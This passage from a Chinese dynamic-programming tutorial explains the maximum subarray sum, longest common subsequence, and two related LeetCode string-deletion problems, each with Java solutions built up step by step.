href="https://labuladong.gitbook.io/algo/shu-ju-jie-gou-xi-lie/shou-ba-shou-shua-shu-zu-ti-mu/hua-dong-chuang-kou-ji-qiao-jin-jie">滑动窗口算法</a>，因为我们前文说过嘛，滑动窗口算法就是专门处理子串/子数组问题的，这里不就是子数组问题么？</p><p>但是，稍加分析就发现，<strong>这道题还不能用滑动窗口算法，因为数组中的数字可以是负数</strong>。</p><p>滑动窗口算法无非就是双指针形成的窗口扫描整个数组/子串，但关键是，你得清楚地知道什么时候应该移动右侧指针来扩大窗口，什么时候移动左侧指针来减小窗口。</p><p>而对于这道题目，你想想，当窗口扩大的时候可能遇到负数，窗口中的值也就可能增加也可能减少，这种情况下不知道什么时机去收缩左侧窗口，也就无法求出「最大子数组和」。</p><p>解决这个问题需要动态规划技巧，但是 <code>dp</code> 数组的定义比较特殊。按照我们常规的动态规划思路，一般是这样定义 <code>dp</code> 数组：</p><p><strong><code>nums[0..i]</code></strong> <strong>中的「最大的子数组和」为</strong> <strong><code>dp[i]</code></strong>。</p><p>如果这样定义的话，整个 <code>nums</code> 数组的「最大子数组和」就是 <code>dp[n-1]</code>。如何找状态转移方程呢？按照数学归纳法，假设我们知道了 <code>dp[i-1]</code>，如何推导出 <code>dp[i]</code> 呢？</p><p>如下图，按照我们刚才对 <code>dp</code> 数组的定义，<code>dp[i] = 5</code> ，也就是等于 <code>nums[0..i]</code> 中的最大子数组和：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大子数组1.jpg" alt="img" style="zoom:50%;" /></p><p>那么在上图这种情况中，利用数学归纳法，你能用 <code>dp[i]</code> 推出 <code>dp[i+1]</code> 吗？</p><p><strong>实际上是不行的，因为子数组一定是连续的，按照我们当前</strong> <strong><code>dp</code></strong> <strong>数组定义，并不能保证</strong> <strong><code>nums[0..i]</code></strong> <strong>中的最大子数组与</strong> <strong><code>nums[i+1]</code></strong> <strong>是相邻的</strong>，也就没办法从 <code>dp[i]</code> 推导出 <code>dp[i+1]</code>。</p><p>所以说我们这样定义 <code>dp</code> 数组是不正确的，无法得到合适的状态转移方程。对于这类子数组问题，我们就要重新定义 <code>dp</code> 数组的含义：</p><p><strong>以</strong> <strong><code>nums[i]</code></strong> <strong>为结尾的「最大子数组和」为</strong> <strong><code>dp[i]</code></strong>。</p><p>这种定义之下，想得到整个 <code>nums</code> 数组的「最大子数组和」，不能直接返回 <code>dp[n-1]</code>，而需要遍历整个 <code>dp</code> 数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> res = Integer.MIN_VALUE;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    res = Math.max(res, dp[i]);<br>&#125;<br><span class="hljs-keyword">return</span> res;<br></code></pre></td></tr></table></figure><p>依然使用数学归纳法来找状态转移关系：假设我们已经算出了 <code>dp[i-1]</code>，如何推导出 <code>dp[i]</code> 呢？</p><p>可以做到，<code>dp[i]</code> 有两种「选择」，要么与前面的相邻子数组连接，形成一个和更大的子数组；要么不与前面的子数组连接，自成一派，自己作为一个子数组。</p><p>如何选择？既然要求「最大子数组和」，当然选择结果更大的那个啦：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 要么自成一派，要么和前面的子数组合并</span><br>dp[i] = Math.max(nums[i], nums[i] + dp[i - <span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p>综上，我们已经写出了状态转移方程，就可以直接写出解法了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-comment">// 第一个元素前面没有子数组</span><br>    dp[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// 状态转移方程</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        dp[i] = Math.max(nums[i], nums[i] + dp[i - <span class="hljs-number">1</span>]);<br>    &#125;<br>    <span class="hljs-comment">// 得到 nums 的最大子数组</span><br>    <span class="hljs-keyword">int</span> res = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        res = Math.max(res, dp[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上解法时间复杂度是 O(N)，空间复杂度也是 O(N)，较暴力解法已经很优秀了，不过<strong>注意到</strong> <strong><code>dp[i]</code></strong> <strong>仅仅和</strong> <strong><code>dp[i-1]</code></strong> <strong>的状态有关</strong>，那么我们可以进行「状态压缩」，将空间复杂度降低：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">int</span> dp_0 = nums[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">int</span> dp_1 = <span class="hljs-number">0</span>, res = dp_0;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-comment">// dp[i] = max(nums[i], nums[i] + dp[i-1])</span><br>        dp_1 = Math.max(nums[i], nums[i] + dp_0);<br>        dp_0 = dp_1;<br>        <span class="hljs-comment">// 顺便计算最大的结果</span><br>        res = Math.max(res, dp_1);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>二、总结</strong></p><p>虽然说动态规划推状态转移方程确实比较玄学，但大部分还是有些规律可循的。</p><p>今天这道「最大子数组和」就和「最长递增子序列」非常类似，<code>dp</code> 数组的定义是「以 <code>nums[i]</code> 为结尾的最大子数组和/最长递增子序列为 <code>dp[i]</code>」。因为只有这样定义才能将 <code>dp[i+1]</code> 和 <code>dp[i]</code> 建立起联系，利用数学归纳法写出状态转移方程。</p><h2 id="6-4-经典动态规划：最长公共子序列"><a href="#6-4-经典动态规划：最长公共子序列" class="headerlink" title="6.4 经典动态规划：最长公共子序列"></a>6.4 经典动态规划：最长公共子序列</h2><p><strong>1、最长公共子序列</strong></p><p>计算最长公共子序列（Longest Common Subsequence，简称 LCS）是一道经典的动态规划题目，大家应该都见过：</p><p>给你输入两个字符串s1和s2，请你找出他们俩的最长公共子序列，返回这个子序列的长度。</p><p>力扣第 1143 题就是这道题，函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(String s1, String s2)</span></span>;<br></code></pre></td></tr></table></figure><p>比如说输入s1 = “zabcde”, s2 = “acez”，它俩的最长公共子序列是lcs = “ace”，长度为 3，所以算法返回 3。</p><p>如果没有做过这道题，一个最简单的暴力算法就是，把s1和s2的所有子序列都穷举出来，然后看看有没有公共的，然后在所有公共子序列里面再寻找一个长度最大的。</p><p>显然，这种思路的复杂度非常高，你要穷举出所有子序列，这个复杂度就是指数级的，肯定不实际。</p><p>正确的思路是不要考虑整个字符串，而是细化到s1和s2的每个字符。前文 子序列解题模板 中总结的一个规律：</p><p><strong>对于两个字符串求子序列的问题，都是用两个指针i和j分别在两个字符串上移动，大概率是动态规划思路</strong>。</p><p>最长公共子序列的问题也可以遵循这个规律，我们可以先写一个dp函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span></span><br></code></pre></td></tr></table></figure><p>这个dp函数的定义是：<strong>dp(s1, i, s2, j)</strong>计算s1[i..]和s2[j..]的最长公共子序列长度。</p><p>根据这个定义，那么我们想要的答案就是dp(s1, 0, s2, 0)，且 base case 就是i == len(s1)或j == len(s2)时，因为这时候s1[i..]或s2[j..]就相当于空串了，最长公共子序列的长度显然是 0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> dp(s1, <span class="hljs-number">0</span>, s2, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* 主函数 */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == s1.length() || j == s2.length()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p><strong>接下来，咱不要看s1和s2两个字符串，而是要具体到每一个字符，思考每个字符该做什么</strong>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/643439fd6f72585703dd4cfd27cf6f77.jpg" alt="img" style="zoom:50%;" /></p><p>我们只看s1[i]和s2[j]，<strong>如果s1[i] == s2[j]，说明这个字符一定在lcs中</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/073b3d10363d81cd3b4af6f09617ce8e.jpg" alt="img" style="zoom:50%;" /></p><p>这样，就找到了一个lcs中的字符，根据dp函数的定义，我们可以完善一下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s1.charAt(i) == s2.charAt(j)) &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 必然在 lcs 中，</span><br>        <span class="hljs-comment">// 加上 s1[i+1..] 和 s2[j+1..] 中的 lcs 长度，就是答案</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + dp(s1, i + <span class="hljs-number">1</span>, s2, j + <span class="hljs-number">1</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚才说的s1[i] == s2[j]的情况，但如果s1[i] != s2[j]，应该怎么办呢？</p><p><strong>s1[i] != s2[j]意味着，s1[i]和s2[j]中至少有一个字符不在lcs中</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/193caf718c689403afad903ec4c866a9.jpg" alt="img" style="zoom:50%;" /></p><p>如上图，总共可能有三种情况，我怎么知道具体是那种情况呢？</p><p>其实我们也不知道，那就把这三种情况的答案都算出来，取其中结果最大的那个呗，因为题目让我们算「最长」公共子序列的长度嘛。</p><p>这三种情况的答案怎么算？回想一下我们的dp函数定义，不就是专门为了计算它们而设计的嘛！</p><p>代码可以再进一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s1.charAt(i) == s2.charAt(j)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + dp(s1, i + <span class="hljs-number">1</span>, s2, j + <span class="hljs-number">1</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 中至少有一个字符不在 lcs 中，</span><br>        <span class="hljs-comment">// 穷举三种情况的结果，取其中的最大结果</span><br>        <span class="hljs-keyword">return</span> Math.max(<br>            <span class="hljs-comment">// 情况一、s1[i] 不在 lcs 中</span><br>            dp(s1, i + <span class="hljs-number">1</span>, s2, j),<br>            <span class="hljs-comment">// 情况二、s2[j] 不在 lcs 中</span><br>            dp(s1, i, s2, j + <span class="hljs-number">1</span>),<br>            <span class="hljs-comment">// 情况三、都不在 lcs 中</span><br>            dp(s1, i + <span class="hljs-number">1</span>, s2, j + <span class="hljs-number">1</span>)<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就已经非常接近我们的最终答案了，<strong>还有一个小的优化，情况三「s1[i]和s2[j]都不在 lcs 中」其实可以直接忽略</strong>。</p><p>因为我们在求最大值嘛，情况三在计算s1[i+1..]和s2[j+1..]的lcs长度，这个长度肯定是小于等于情况二s1[i..]和s2[j+1..]中的lcs长度的，因为s1[i+1..]比s1[i..]短嘛，那从这里面算出的lcs当然也不可能更长嘛。</p><p>同理，情况三的结果肯定也小于等于情况一。<strong>说白了，情况三被情况一和情况二包含了</strong>，所以我们可以直接忽略掉情况三，完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 备忘录，消除重叠子问题</span><br><span class="hljs-keyword">int</span>[][] memo;<br><br><span class="hljs-comment">/* 主函数 */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-comment">// 备忘录值为 -1 代表未曾计算</span><br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m][n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] row : memo) <br>        Arrays.fill(row, -<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 计算 s1[0..] 和 s2[0..] 的 lcs 长度</span><br>    <span class="hljs-keyword">return</span> dp(s1, <span class="hljs-number">0</span>, s2, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == s1.length() || j == s2.length()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果之前计算过，则直接返回备忘录中的答案</span><br>    <span class="hljs-keyword">if</span> (memo[i][j] != -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> memo[i][j];<br>    &#125;<br>    <span class="hljs-comment">// 根据 s1[i] 和 s2[j] 的情况做选择</span><br>    <span class="hljs-keyword">if</span> (s1.charAt(i) == s2.charAt(j)) &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 必然在 lcs 中</span><br>        memo[i][j] = <span class="hljs-number">1</span> + dp(s1, i + <span class="hljs-number">1</span>, s2, j + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 至少有一个不在 lcs 中</span><br>        memo[i][j] = Math.max(<br>            dp(s1, i + <span class="hljs-number">1</span>, s2, j),<br>            dp(s1, i, s2, j + <span class="hljs-number">1</span>)<br>        );<br>    &#125;<br>    <span class="hljs-keyword">return</span> memo[i][j];<br>&#125;<br></code></pre></td></tr></table></figure><p>以上思路完全就是按照我们之前的爆文 动态规划套路框架 来的，应该是很容易理解的。至于为什么要加memo备忘录，我们之前写过很多次，为了照顾新来的读者，这里再简单重复一下，首先抽象出我们核心dp函数的递归框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    dp(i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>); <span class="hljs-comment">// #1</span><br>    dp(i, j + <span class="hljs-number">1</span>);     <span class="hljs-comment">// #2</span><br>    dp(i + <span class="hljs-number">1</span>, j);     <span class="hljs-comment">// #3</span><br>&#125;<br></code></pre></td></tr></table></figure><p>你看，假设我想从dp(i, j)转移到dp(i+1, j+1)，有不止一种方式，可以直接走#1，也可以走#2 -&gt; #3，也可以走#3 -&gt; #2。</p><p>这就是重叠子问题，如果我们不用memo备忘录消除子问题，那么dp(i+1, j+1)就会被多次计算，这是没有必要的。</p><p>至此，最长公共子序列问题就完全解决了，用的是自顶向下带备忘录的动态规划思路，我们当然也可以使用自底向上的迭代的动态规划思路，和我们的递归思路一样，关键是如何定义dp数组，我这里也写一下自底向上的解法吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m + <span class="hljs-number">1</span>][n + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// 定义：s1[0..i-1] 和 s2[0..j-1] 的 lcs 长度为 dp[i][j]</span><br>    <span class="hljs-comment">// 目标：s1[0..m-1] 和 s2[0..n-1] 的 lcs 长度，即 dp[m][n]</span><br>    <span class="hljs-comment">// base case: dp[0][..] = dp[..][0] = 0</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++) &#123;<br>            <span class="hljs-comment">// 现在 i 和 j 从 1 开始，所以要减一</span><br>            <span class="hljs-keyword">if</span> (s1.charAt(i - <span class="hljs-number">1</span>) == s2.charAt(j - <span class="hljs-number">1</span>)) &#123;<br>                <span class="hljs-comment">// s1[i-1] 和 s2[j-1] 必然在 lcs 中</span><br>                dp[i][j] = <span class="hljs-number">1</span> + dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// s1[i-1] 和 s2[j-1] 至少有一个不在 lcs 中</span><br>                dp[i][j] = Math.max(dp[i][j - <span class="hljs-number">1</span>], dp[i - <span class="hljs-number">1</span>][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dp[m][n];<br>&#125;<br></code></pre></td></tr></table></figure><p>自底向上的解法中dp数组定义的方式和我们的递归解法有一点差异，而且由于数组索引从 0 开始，有索引偏移，不过思路和我们的递归解法完全相同，如果你看懂了递归解法，这个解法应该不难理解。</p><p>另外，自底向上的解法可以通过我们前文讲过的 动态规划状态压缩技巧 来进行优化，把空间复杂度压缩为 O(N)，这里由于篇幅所限，就不展开了。</p><p>下面，来看两道和最长公共子序列相似的两道题目。</p><p><strong>2、字符串的删除操作</strong></p><p>这是力扣第 583 题「两个字符串的删除操作」，看下题目：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/5ddf13dc5c6f09a200966ab955ba158d.jpg" alt="img" style="zoom:50%;" /></p><p>函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String s1, String s2)</span></span>;<br></code></pre></td></tr></table></figure><p>题目让我们计算将两个字符串变得相同的最少删除次数，那我们可以思考一下，最后这两个字符串会被删成什么样子？</p><p>删除的结果不就是它俩的最长公共子序列嘛！</p><p>那么，要计算删除的次数，就可以通过最长公共子序列的长度推导出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-comment">// 复用前文计算 lcs 长度的函数</span><br>    <span class="hljs-keyword">int</span> lcs = longestCommonSubsequence(s1, s2);<br>    <span class="hljs-keyword">return</span> m - lcs + n - lcs;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题就解决了！</p><p><strong>3、最小 ASCII 删除和</strong></p><p>这是力扣第 712 题，看下题目：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/479e4de65daf3663f12bd2d0bff5528d.jpg" alt="img" style="zoom:50%;" /></p><p>这道题，和上一道题非常类似，这回不问我们删除的字符个数了，问我们删除的字符的 ASCII 码加起来是多少。</p><p>那就不能直接复用计算最长公共子序列的函数了，但是可以依照之前的思路，<strong>稍微修改 base case 和状态转移部分即可直接写出解法代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 备忘录</span><br><span class="hljs-keyword">int</span> memo[][];<br><span class="hljs-comment">/* 主函数 */</span>    <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minimumDeleteSum</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-comment">// 备忘录值为 -1 代表未曾计算</span><br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m][n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] row : memo) <br>        Arrays.fill(row, -<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> dp(s1, <span class="hljs-number">0</span>, s2, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 定义：将 s1[i..] 和 s2[j..] 删除成相同字符串，</span><br><span class="hljs-comment">// 最小的 ASCII 码之和为 dp(s1, i, s2, j)。</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(String s1, <span class="hljs-keyword">int</span> i, String s2, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == s1.length()) &#123;<br>        <span class="hljs-comment">// 如果 s1 到头了，那么 s2 剩下的都得删除</span><br>        <span class="hljs-keyword">for</span> (; j &lt; s2.length(); j++)<br>            res += s2.charAt(j);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (j == s2.length()) &#123;<br>        <span class="hljs-comment">// 如果 s2 到头了，那么 s1 剩下的都得删除</span><br>        <span class="hljs-keyword">for</span> (; i &lt; s1.length(); i++)<br>            res += s1.charAt(i);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (memo[i][j] != -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> memo[i][j];<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (s1.charAt(i) == s2.charAt(j)) &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 都是在 lcs 中的，不用删除</span><br>        memo[i][j] = dp(s1, i + <span class="hljs-number">1</span>, s2, j + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// s1[i] 和 s2[j] 